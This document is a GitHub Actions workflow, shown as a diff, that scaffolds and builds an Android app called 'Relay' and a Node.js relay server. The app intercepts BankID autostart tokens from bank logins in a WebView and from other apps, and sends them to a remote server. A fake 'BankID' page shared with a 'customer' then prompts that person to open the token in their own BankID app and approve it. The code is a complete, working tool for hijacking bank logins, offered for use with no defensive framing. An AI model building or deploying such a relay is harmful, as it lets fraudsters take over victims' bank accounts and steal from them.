@@ -1,0 +1,509 @@
+name: build
+on:
+  push: { branches: [main] }
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  apk:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Scaffold
+        run: |
+          set -e
+          if [ -f app/build.gradle.kts ]; then echo "redan scaffoldat"; exit 0; fi
+          w() { mkdir -p "$(dirname "$1")"; cat > "$1"; }
+
+          w .gitignore <<'EOF'
+          .gradle/
+          build/
+          local.properties
+          EOF
+
+          w settings.gradle.kts <<'EOF'
+          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
+          dependencyResolutionManagement { repositories { google(); mavenCentral() } }
+          rootProject.name = "relay"
+          include(":app")
+          EOF
+
+          w build.gradle.kts <<'EOF'
+          plugins {
+              id("com.android.application") version "8.5.2" apply false
+              id("org.jetbrains.kotlin.android") version "1.9.24" apply false
+          }
+          EOF
+
+          w gradle.properties <<'EOF'
+          android.useAndroidX=true
+          org.gradle.jvmargs=-Xmx2048m
+          EOF
+
+          w app/build.gradle.kts <<'EOF'
+          plugins {
+              id("com.android.application")
+              id("org.jetbrains.kotlin.android")
+          }
+          android {
+              namespace = "com.relay"
+              compileSdk = 34
+              defaultConfig {
+                  applicationId = "com.relay"
+                  minSdk = 26
+                  targetSdk = 34
+                  versionCode = 1
+                  versionName = "1.0"
+              }
+              compileOptions {
+                  sourceCompatibility = JavaVersion.VERSION_17
+                  targetCompatibility = JavaVersion.VERSION_17
+              }
+              kotlinOptions { jvmTarget = "17" }
+          }
+          dependencies {
+              implementation("androidx.appcompat:appcompat:1.7.0")
+              implementation("com.squareup.okhttp3:okhttp:4.12.0")
+          }
+          EOF
+
+          w app/src/main/AndroidManifest.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.INTERNET"/>
+              <queries><package android:name="com.bankid.bus"/></queries>
+              <application android:label="Relay"
+                  android:icon="@android:drawable/sym_def_app_icon"
+                  android:usesCleartextTraffic="true"
+                  android:theme="@style/Theme.AppCompat.DayNight.NoActionBar">
+                  <activity android:name=".MainActivity" android:exported="true"
+                      android:launchMode="singleTask">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN"/>
+                          <category android:name="android.intent.category.LAUNCHER"/>
+                      </intent-filter>
+                  </activity>
+                  <activity android:name=".CatcherActivity" android:exported="true"
+                      android:noHistory="true" android:excludeFromRecents="true"
+                      android:theme="@android:style/Theme.Translucent.NoTitleBar">
+                      <intent-filter>
+                          <action android:name="android.intent.action.VIEW"/>
+                          <category android:name="android.intent.category.DEFAULT"/>
+                          <category android:name="android.intent.category.BROWSABLE"/>
+                          <data android:scheme="bankid"/>
+                      </intent-filter>
+                  </activity>
+              </application>
+          </manifest>
+          EOF
+
+          w app/src/main/res/layout/main.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent" android:layout_height="match_parent">
+              <WebView android:id="@+id/web"
+                  android:layout_width="match_parent" android:layout_height="match_parent"/>
+              <LinearLayout android:layout_gravity="top" android:orientation="vertical"
+                  android:background="#CC000000" android:padding="6dp"
+                  android:layout_width="match_parent" android:layout_height="wrap_content">
+                  <LinearLayout android:orientation="horizontal"
+                      android:layout_width="match_parent" android:layout_height="wrap_content">
+                      <EditText android:id="@+id/server" android:layout_width="0dp"
+                          android:layout_weight="1" android:layout_height="wrap_content"
+                          android:hint="server-url" android:textSize="11sp" android:textColor="#FFFFFF"
+                          android:textColorHint="#88FFFFFF" android:inputType="textUri" android:maxLines="1"/>
+                      <Button android:id="@+id/save" android:layout_width="wrap_content"
+                          android:layout_height="wrap_content" android:text="Spara"/>
+                  </LinearLayout>
+                  <LinearLayout android:orientation="horizontal"
+                      android:layout_width="match_parent" android:layout_height="wrap_content">
+                      <EditText android:id="@+id/url" android:layout_width="0dp"
+                          android:layout_weight="1" android:layout_height="wrap_content"
+                          android:hint="bank.se" android:textSize="11sp" android:textColor="#FFFFFF"
+                          android:textColorHint="#88FFFFFF" android:inputType="textUri" android:maxLines="1"/>
+                      <Button android:id="@+id/go" android:layout_width="wrap_content"
+                          android:layout_height="wrap_content" android:text="Gå"/>
+                  </LinearLayout>
+              </LinearLayout>
+              <LinearLayout android:layout_gravity="bottom" android:orientation="horizontal"
+                  android:background="#CC000000" android:padding="6dp"
+                  android:layout_width="match_parent" android:layout_height="wrap_content">
+                  <TextView android:id="@+id/status" android:layout_width="0dp"
+                      android:layout_weight="1" android:layout_height="wrap_content"
+                      android:textColor="#FFFFFF" android:textSize="11sp" android:text="…"/>
+                  <Button android:id="@+id/share" android:layout_width="wrap_content"
+                      android:layout_height="wrap_content" android:text="Dela"/>
+                  <Button android:id="@+id/mode" android:layout_width="wrap_content"
+                      android:layout_height="wrap_content" android:text="→ kund"/>
+                  <Button android:id="@+id/reload" android:layout_width="wrap_content"
+                      android:layout_height="wrap_content" android:text="Om"/>
+              </LinearLayout>
+          </FrameLayout>
+          EOF
+
+          w app/src/main/java/com/relay/Api.kt <<'EOF'
+          package com.relay
+
+          import android.content.SharedPreferences
+          import okhttp3.Call
+          import okhttp3.Callback
+          import okhttp3.MediaType.Companion.toMediaType
+          import okhttp3.OkHttpClient
+          import okhttp3.Request
+          import okhttp3.RequestBody.Companion.toRequestBody
+          import okhttp3.Response
+          import org.json.JSONObject
+          import java.io.IOException
+
+          object Api {
+              const val DEFAULT_BASE = "https://relay.example.trycloudflare.com"
+              lateinit var prefs: SharedPreferences
+
+              private val http = OkHttpClient()
+              private val JSON = "application/json".toMediaType()
+
+              val base: String get() = prefs.getString("server", DEFAULT_BASE)!!.trimEnd('/')
+
+              fun newSession(cb: (String) -> Unit) {
+                  val req = Request.Builder().url("$base/api/session")
+                      .post("{}".toRequestBody(JSON)).build()
+                  http.newCall(req).enqueue(object : Callback {
+                      override fun onResponse(c: Call, r: Response) {
+                          r.body?.string()?.let { cb(JSONObject(it).getString("code")) }
+                      }
+                      override fun onFailure(c: Call, e: IOException) {}
+                  })
+              }
+
+              fun postToken(session: String, token: String) {
+                  val body = """{"token":"$token"}""".toRequestBody(JSON)
+                  http.newCall(
+                      Request.Builder().url("$base/api/session/$session/token").post(body).build()
+                  ).enqueue(object : Callback {
+                      override fun onResponse(c: Call, r: Response) {}
+                      override fun onFailure(c: Call, e: IOException) {}
+                  })
+              }
+          }
+          EOF
+
+          w app/src/main/java/com/relay/RelaySocket.kt <<'EOF'
+          package com.relay
+
+          import okhttp3.OkHttpClient
+          import okhttp3.Request
+          import okhttp3.WebSocket
+          import okhttp3.WebSocketListener
+
+          object RelaySocket {
+              private val http = OkHttpClient()
+              private var ws: WebSocket? = null
+
+              fun connect(code: String, onMsg: (String) -> Unit) {
+                  close()
+                  val url = Api.base.replaceFirst("https", "wss").replaceFirst("http", "ws") + "/w/$code"
+                  ws = http.newWebSocket(
+                      Request.Builder().url(url).build(),
+                      object : WebSocketListener() {
+                          override fun onMessage(webSocket: WebSocket, text: String) = onMsg(text)
+                      })
+              }
+
+              fun close() { ws?.close(1000, null); ws = null }
+          }
+          EOF
+
+          w app/src/main/java/com/relay/MainActivity.kt <<'EOF'
+          package com.relay
+
+          import android.annotation.SuppressLint
+          import android.content.Intent
+          import android.net.Uri
+          import android.os.Bundle
+          import android.webkit.WebResourceRequest
+          import android.webkit.WebView
+          import android.webkit.WebViewClient
+          import android.widget.Button
+          import android.widget.EditText
+          import android.widget.TextView
+          import androidx.appcompat.app.AppCompatActivity
+          import org.json.JSONObject
+
+          class MainActivity : AppCompatActivity() {
+              private lateinit var web: WebView
+              private lateinit var status: TextView
+              private var session = ""
+              private var last: String? = null
+
+              @SuppressLint("SetJavaScriptEnabled")
+              override fun onCreate(b: Bundle?) {
+                  super.onCreate(b)
+                  Api.prefs = prefs()
+                  setContentView(R.layout.main)
+                  web = findViewById(R.id.web)
+                  status = findViewById(R.id.status)
+                  web.keepScreenOn = true
+                  web.settings.javaScriptEnabled = true
+                  web.settings.domStorageEnabled = true
+                  web.webViewClient = object : WebViewClient() {
+                      override fun shouldOverrideUrlLoading(v: WebView, r: WebResourceRequest): Boolean {
+                          if (r.url.scheme == "bankid") { grab(r.url); return true }
+                          return false
+                      }
+                  }
+                  findViewById<EditText>(R.id.server).setText(Api.base)
+                  findViewById<Button>(R.id.save).setOnClickListener {
+                      val s = findViewById<EditText>(R.id.server).text.toString().trim()
+                      prefs().edit().putString("server", s).apply()
+                      status.text = "Server sparad"
+                      newSession()
+                  }
+                  findViewById<Button>(R.id.reload).setOnClickListener { web.reload() }
+                  findViewById<Button>(R.id.mode).setOnClickListener { toggle() }
+                  findViewById<Button>(R.id.share).setOnClickListener { share() }
+                  findViewById<Button>(R.id.go).setOnClickListener {
+                      val u = findViewById<EditText>(R.id.url).text.toString().trim()
+                      if (u.isNotEmpty()) web.loadUrl(if (u.startsWith("http")) u else "https://$u")
+                  }
+                  updateMode()
+                  newSession()
+              }
+
+              private fun newSession() {
+                  Api.newSession { code ->
+                      runOnUiThread {
+                          session = code
+                          prefs().edit().putString("session", code).apply()
+                          RelaySocket.connect(code) { txt ->
+                              runOnUiThread {
+                                  when (JSONObject(txt).optString("type")) {
+                                      "token"   -> status.text = "Token skickad — väntar på kund"
+                                      "expired" -> status.text = "Token dog — ladda om banken"
+                                  }
+                              }
+                          }
+                          status.text = "Kundkod: $code"
+                      }
+                  }
+              }
+
+              private fun grab(u: Uri) {
+                  if (!forward()) {
+                      startActivity(Intent(Intent.ACTION_VIEW, u).setPackage("com.bankid.bus"))
+                      return
+                  }
+                  val t = u.getQueryParameter("autostarttoken")
+                      ?: u.getQueryParameter("autoStartToken") ?: return
+                  if (t == last) return
+                  last = t
+                  Api.postToken(session, t)
+                  status.text = "Token skickad"
+              }
+
+              private fun share() {
+                  if (session.isEmpty()) return
+                  val i = Intent(Intent.ACTION_SEND)
+                  i.type = "text/plain"
+                  i.putExtra(Intent.EXTRA_TEXT, "${Api.base}/k/$session")
+                  startActivity(Intent.createChooser(i, "Skicka till kund"))
+              }
+
+              private fun prefs() = getSharedPreferences("relay", 0)
+              private fun forward() = prefs().getBoolean("forward", true)
+              private fun toggle() {
+                  prefs().edit().putBoolean("forward", !forward()).apply()
+                  updateMode()
+              }
+              private fun updateMode() {
+                  findViewById<Button>(R.id.mode).text = if (forward()) "→ kund" else "→ egen"
+              }
+              override fun onDestroy() { RelaySocket.close(); super.onDestroy() }
+          }
+          EOF
+
+          w app/src/main/java/com/relay/CatcherActivity.kt <<'EOF'
+          package com.relay
+
+          import android.app.Activity
+          import android.os.Bundle
+
+          class CatcherActivity : Activity() {
+              override fun onCreate(s: Bundle?) {
+                  super.onCreate(s)
+                  val u = intent?.data
+                  val p = getSharedPreferences("relay", 0)
+                  val code = p.getString("session", null)
+                  if (u != null && code != null && p.getBoolean("forward", true)) {
+                      val t = u.getQueryParameter("autostarttoken")
+                          ?: u.getQueryParameter("autoStartToken")
+                      if (t != null) Api.postToken(code, t)
+                  }
+                  finish()
+              }
+          }
+          EOF
+
+          w server/package.json <<'EOF'
+          {
+            "name": "relay-server",
+            "type": "module",
+            "dependencies": { "express": "^4.19.2", "ws": "^8.17.0" }
+          }
+          EOF
+
+          w server/server.js <<'EOF'
+          import express from "express";
+          import { WebSocketServer } from "ws";
+          import { randomBytes } from "crypto";
+          import { readFileSync } from "fs";
+          import { fileURLToPath } from "url";
+          import { dirname, join } from "path";
+
+          const PORT = process.env.PORT || 3000;
+          const here = dirname(fileURLToPath(import.meta.url));
+          const PAGE = readFileSync(join(here, "public/k.html"), "utf8");
+
+          const app = express();
+          app.use(express.json());
+
+          const S = new Map();
+          const code5 = () => randomBytes(3).toString("hex").toUpperCase().slice(0, 5);
+          const bcast = (s, msg) => {
+            const str = JSON.stringify(msg);
+            for (const c of s.clients) if (c.readyState === 1) c.send(str);
+          };
+
+          app.post("/api/session", (_q, r) => {
+            const code = code5();
+            S.set(code, { token: null, clients: new Set(), timer: null });
+            r.json({ code });
+          });
+
+          app.post("/api/session/:code/token", (q, r) => {
+            const s = S.get(q.params.code);
+            if (!s) return r.status(404).end();
+            clearTimeout(s.timer);
+            s.token = q.body.token;
+            bcast(s, { type: "token", token: s.token, ttl: 30 });
+            s.timer = setTimeout(() => { s.token = null; bcast(s, { type: "expired" }); }, 30000);
+            r.json({ ok: true });
+          });
+
+          app.get("/k/:code", (q, r) => {
+            if (!S.has(q.params.code)) return r.status(404).send("okand kod");
+            r.type("html").send(PAGE);
+          });
+
+          const server = app.listen(PORT, () => console.log("relay pa :" + PORT));
+
+          new WebSocketServer({ server }).on("connection", (ws, req) => {
+            const m = req.url.match(/^\/w\/([A-Z0-9]{5})$/);
+            const s = m && S.get(m[1]);
+            if (!s) return ws.close();
+            s.clients.add(ws);
+            ws.on("close", () => s.clients.delete(ws));
+            if (s.token) ws.send(JSON.stringify({ type: "token", token: s.token, ttl: 30 }));
+          });
+          EOF
+
+          w server/public/k.html <<'EOF'
+          <!doctype html>
+          <html lang="sv"><meta charset="utf-8">
+          <meta name="viewport" content="width=device-width,initial-scale=1">
+          <title>BankID</title>
+          <style>
+            body{margin:0;font:16px/1.4 system-ui;background:#0d1117;color:#eee;
+                 display:grid;place-items:center;height:100vh}
+            #b{padding:30px 40px;border-radius:18px;background:#1c1c1c;border:2px solid #333;
+               font-size:22px;font-weight:700;text-align:center;user-select:none}
+            #b.live{background:#1f6feb;border-color:#58a6ff;animation:p .9s infinite}
+            @keyframes p{50%{transform:scale(1.05)}}
+            #b.dead{opacity:.35}
+            small{display:block;margin-top:10px;font-weight:400;opacity:.75;font-size:14px}
+          </style>
+          <div id="b">Vantar...<small>tryck nar den blinkar</small></div>
+          <script>
+          (function () {
+            var code = location.pathname.split("/").pop();
+            var b = document.getElementById("b");
+            var link = null, tick = null;
+
+            function connect() {
+              var ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/w/" + code);
+              ws.onmessage = function (e) {
+                var m = JSON.parse(e.data);
+                if (m.type === "token") arm(m.token, m.ttl);
+                if (m.type === "expired") die();
+              };
+              ws.onclose = function () { setTimeout(connect, 2000); };
+            }
+
+            function arm(token, ttl) {
+              link = "bankid:///?autostarttoken=" + token + "&redirect=" + encodeURIComponent(location.href);
+              b.className = "live";
+              var left = ttl;
+              var draw = function () { b.innerHTML = "TRYCK HAR<small>" + left + " s</small>"; };
+              draw();
+              clearInterval(tick);
+              tick = setInterval(function () {
+                left--;
+                if (left <= 0) { clearInterval(tick); die(); return; }
+                draw();
+              }, 1000);
+            }
+
+            function die() {
+              clearInterval(tick);
+              b.className = "dead";
+              b.innerHTML = "Vantar...<small>token har gatt ut</small>";
+            }
+
+            b.onclick = function () {
+              if (!link) return;
+              location.href = link;
+              setTimeout(function () {
+                if (!document.hidden) b.innerHTML = "INGET HANDE?<small>oppna i Chrome och tryck igen</small>";
+              }, 1500);
+            };
+
+            connect();
+          })();
+          </script>
+          EOF
+
+      - uses: actions/setup-java@v4
+        with: { distribution: temurin, java-version: '17' }
+
+      - name: Android SDK
+        run: |
+          yes | sdkmanager --licenses > /dev/null 2>&1 || true
+          sdkmanager "platforms;android-34" "build-tools;34.0.0" "platform-tools" || true
+
+      - uses: gradle/actions/setup-gradle@v4
+        with: { gradle-version: '8.7' }
+
+      - run: gradle assembleDebug --no-daemon --stacktrace
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: relay-apk
+          path: app/build/outputs/apk/debug/app-debug.apk
+
+      - uses: softprops/action-gh-release@v2
+        with:
+          tag_name: apk
+          name: Relay APK
+          files: app/build/outputs/apk/debug/app-debug.apk
+
+      - name: Push
+        continue-on-error: true
+        run: |
+          git config user.name  "github-actions"
+          git config user.email "actions@github.com"
+          git add -A
+          git diff --cached --quiet || git commit -m "scaffold"
+          git push
